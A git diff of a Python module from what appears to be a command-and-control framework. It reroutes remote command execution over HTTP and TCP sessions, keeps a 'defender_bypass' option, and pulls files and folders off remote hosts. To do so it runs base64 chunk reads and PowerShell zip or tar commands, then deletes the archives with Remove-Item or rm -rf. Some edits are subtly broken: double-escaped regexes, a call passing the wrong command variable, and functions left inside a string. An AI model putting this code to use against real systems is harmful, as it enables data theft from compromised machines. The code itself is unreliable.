@@ -9,6 +9,11 @@ from core import utils
 from core.session_handlers import session_manager, sessions
 from core.utils import defender
 from core.session_handlers.sessions import SessionManager
+
+# Command Execution Imports
+from core.command_execution.http_command_execution import run_command_http as http_exec
+from core.command_execution.tcp_command_execution import run_command_tcp as tcp_exec
+
 import queue
 import subprocess, os, sys
 from tqdm import tqdm
@@ -40,7 +45,7 @@ def print_raw_progress(current, total, bar_width=40):
 	sys.stdout.write("\r" + bar)
 	sys.stdout.flush()
 
-def run_command_http(sid, cmd, output=True, defender_bypass=False, op_id=False):
+'''def http_exec(sid, cmd, output=True, defender_bypass=False, op_id=False):
 	session = session_manager.sessions[sid]
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 	meta = session.metadata
@@ -135,7 +140,7 @@ def run_command_http(sid, cmd, output=True, defender_bypass=False, op_id=False):
 	else:
 		return
 
-def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False, timeoutprint=True, retries=0, op_id="console"):
+def tcp_exec(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False, timeoutprint=True, retries=0, op_id="console"):
 	session = session_manager.sessions[sid]
 	meta = session.metadata
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
@@ -299,7 +304,7 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 			if other_op == op_id:
 				continue
 
-			for mm in re.finditer(rf"__OP__{other_op}__\s*(.*?)\s*__ENDOP__{other_op}__", response, re.DOTALL):
+			for mm in re.finditer(rf"__OP__{other_op}__\\s*(.*?)\\s*__ENDOP__{other_op}__", response, re.DOTALL):
 				q.put(mm.group(1))
 
 		logger.debug(brightyellow + f"GOT RESPONSE {response} TYPE {type(response)}")
@@ -307,7 +312,7 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 		# ─── now pull out *your* own slice (and clear your queue if it’s fresh) ───
 		logger.debug("RUNNING RE.SEARCH")
 		logger.debug(f"VERIFIED START TOK IS {start_tok} END TOK IS {end_tok}")
-		m = re.search(rf"{re.escape(start_tok)}\s*(.*?)\s*{re.escape(end_tok)}", response, re.DOTALL)
+		m = re.search(rf"{re.escape(start_tok)}\\s*(.*?)\\s*{re.escape(end_tok)}", response, re.DOTALL)
 
 		if m:
 			my_out = m.group(1)
@@ -336,7 +341,7 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 
 	except Exception as e:
 		return f"[!] Error: {e}"
-
+'''
 
 def interactive_http_shell(sid):
 	session = session_manager.sessions[sid]
@@ -678,7 +683,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 			return"""
 
 		# Step 1: Get file size via HTTP‐C2
-		size_output = run_command_http(sid, f"stat -c %s {remote_file}", op_id=op_id)
+		size_output = http_exec(sid, f"stat -c %s {remote_file}", op_id=op_id)
 		logger.debug(brightyellow + f"SIZE OUTPUT: {size_output}")
 		try:
 			file_size = int(size_output.strip())
@@ -701,7 +706,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 
 				# Step 2: Fetch each chunk via HTTP-C2
 				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
-				chunk_output = run_command_http(sid, chunk_cmd, op_id=op_id)
+				chunk_output = http_exec(sid, chunk_cmd, op_id=op_id)
 
 				try:
 					data = base64.b64decode(chunk_output)
@@ -776,7 +781,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 
 		sleep(0.03)
 		logger.debug(brightyellow + f"RUNNING COMMAND {size_cmd}" + reset)
-		size_output = run_command_http(sid, size_cmd, op_id=op_id)
+		size_output = http_exec(sid, size_cmd, op_id=op_id)
 		logger.debug(f"SIZE OUTPUT IN DOWNLOAD FILE: {size_output}")
 		try:
 			# size_output is something like "49,50,51,…"
@@ -808,7 +813,7 @@ def download_file_http(sid, remote_file, local_file, op_id="console"):
 				)
 
 				# Step 2: Fetch this chunk via HTTP-C2
-				chunk_output = run_command_http(sid, chunk_cmd, op_id=op_id)
+				chunk_output = http_exec(sid, chunk_cmd, op_id=op_id)
 
 				try:
 					data = base64.b64decode(chunk_output)
@@ -894,7 +899,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 		cmd = ("if(-Not (Test-Path \"{0}\"))"
 			"{{ Set-Content \"{0}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) }}").format(remote_zip)
 
-		run_command_http(sid, cmd, output=False, op_id=op_id)
+		http_exec(sid, cmd, output=False, op_id=op_id)
 
 		# 2) copy the folder contents into it via .NET
 		zip_cmd = (
@@ -905,7 +910,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 
 
 		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
-		run_command_http(sid, zip_cmd, output=False, op_id=op_id)
+		http_exec(sid, zip_cmd, output=False, op_id=op_id)
 
 		# 2a) wait until the zip actually exists on the remote
 		check_ps = (
@@ -915,7 +920,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 
 		print(brightyellow + "[*] Waiting for remote archive to appear…")
 		while True:
-			out = run_command_http(sid, check_ps, op_id=op_id)
+			out = http_exec(sid, check_ps, op_id=op_id)
 			logger.debug(f"TEST PATH OUTPUT: {out}")
 			if out and "EXISTS" in out.upper():
 				logger.debug(brightgreen + f"FOUND EXISTS IN OUTPUT")
@@ -964,7 +969,7 @@ def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 
 		# 5) cleanup remote zip (no output)
 		cleanup_cmd = f"Remove-Item \"{remote_zip}\" -Force"
-		run_command_http(sid, cleanup_cmd, output=False, op_id=op_id)
+		http_exec(sid, cleanup_cmd, output=False, op_id=op_id)
 
 		print(brightgreen + "[+] Extraction complete")
 
@@ -1039,7 +1044,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
 			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
 		)
-		run_quiet_tcpcmd(sid, cmd)
+		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		# COM copy into zip
 		zip_cmd = (
@@ -1049,7 +1054,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		)
 
 		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
-		run_quiet_tcpcmd(sid, zip_cmd)
+		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		check_ps = (
 			f"if (Test-Path \"{remote_zip}\") "
@@ -1059,7 +1064,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		try:
 			while True:
 				global_tcpoutput_blocker = 0
-				out = run_command_tcp(sid, check_ps, timeout=0.5)
+				out = tcp_exec(sid, check_ps, timeout=0.5)
 				try:
 					if "EXISTS" in out or "exists" in out:
 						break
@@ -1114,7 +1119,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
 
 		cmd = f"Remove-Item \"{remote_zip}\" -Force"
-		run_quiet_tcpcmd(sid, cmd)
+		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		print(brightgreen + "[+] Extraction complete")
 
@@ -1124,7 +1129,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
 		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
 		
-		run_quiet_tcpcmd(sid, cmd)
+		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		try:
 			local_tar = local_dir.rstrip(os.sep) + ".tar.gz"
@@ -1156,7 +1161,7 @@ def download_folder_tcp(sid, remote_dir, local_dir):
 			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")
 
 		cmd = f"rm -rf \"{remote_tar}\""
-		run_quiet_tcpcmd(sid, cmd)
+		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)
 
 		print(brightgreen + "[+] Extraction complete")
 
@@ -1787,21 +1792,7 @@ def get_display(sid):
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 	return display
 
-def run_quiet_tcpcmd(sid, cmd, timeout=0.5):
+def run_quiet_tcpcmd(sid, cmd, timeout=0.5, portscan_active=True, retries=1):
 	global_tcpoutput_blocker = 1
-	run_command_tcp(sid, cmd, timeout)
+	tcp_exec(sid, cmd, timeout)
 	global_tcpoutput_blocker = 0
-
-
-output_queue = queue.Queue()
-
-def printer_thread():
-	while True:
-		sid, out_b64 = output_queue.get()
-		try:
-			out = base64.b64decode(out_b64).decode("utf-8", "ignore")
-			#print("TEST")
-		except:
-			out = "<decoding error>"
-		print(f"\n[{sid}] {out.strip()}")
-
